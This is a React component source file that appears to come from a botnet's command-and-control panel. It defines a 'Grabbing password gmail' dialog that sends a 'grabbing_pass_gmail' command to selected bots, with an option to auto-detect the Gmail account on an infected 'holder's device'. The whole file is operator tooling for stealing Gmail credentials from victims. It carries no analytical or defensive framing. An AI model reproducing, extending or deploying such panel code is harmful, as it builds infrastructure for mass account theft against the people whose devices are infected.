import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

class Grabbing_pass_gmail extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          score: '',
          gmail: '',
          checked: false
        }
    }

    onChangeGmail = (e) => {
        this.setState({ 
            gmail: e.target.value
        });
    }

    onChangeScore = (e) => {
        this.setState({ 
            score: e.target.value
        });
    }

    FaCheckBox() {
        return this.state.checked ? 'far fa-check-square' : 'far fa-square';
    }

    toggleChange(){
        if(this.state.checked){
            this.setState({checked: false});
            try_eval("document.getElementById('inp_gmail').removeAttribute('disabled')");
            
        }else{
            this.setState({checked: true, gmail: ''});
            try_eval("document.getElementById('inp_gmail').setAttribute('disabled','disabled')");
        }
        this.forceUpdate();
    }

    onSendRequest = (e) => {
        if(SettingsContext.BotsSelected()) {
            try_eval('$.notify("Added command [grabbing_pass_gmail]", "info");');

            let gmail = this.state.gmail;
            if(this.state.checked){
                gmail = 'default_gmail';
            }

            SettingsContext.BotSendCommand('{"cmd":"grabbing_pass_gmail","score":"' + this.state.score + '","gmail":"' + gmail + '"}');
            this.setState({ 
                score: '',
                gmail: ''
            });
          
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="modal fade" id="modalgrabbing_pass_gmail" tabindex="-1" role="dialog" aria-labelledby="modalgrabbing_pass_gmail" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Grabbing password gmail</h5>

                            <div class="modal-body">
                                <i style={({marginLeft:'5px', paddingRight:'6px'})} class={this.FaCheckBox()} onClick={this.toggleChange.bind(this)} />Auto-detect gmail on holder's device 
                                <input class="form-control"  id="inp_gmail" value={this.state.gmail} onChange={this.onChangeGmail} placeholder="Gmail" />
                                <input class="form-control" id="inp_score" value={this.state.score} onChange={this.onChangeScore} placeholder="Score for example 15" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onSendRequest} class="btn btn-outline-primary"  data-dismiss="modal">Send command</button>
                            </div>
                        </div>
                    </div>
                </div>

            </React.Fragment>
        );
    }
}

export default Grabbing_pass_gmail;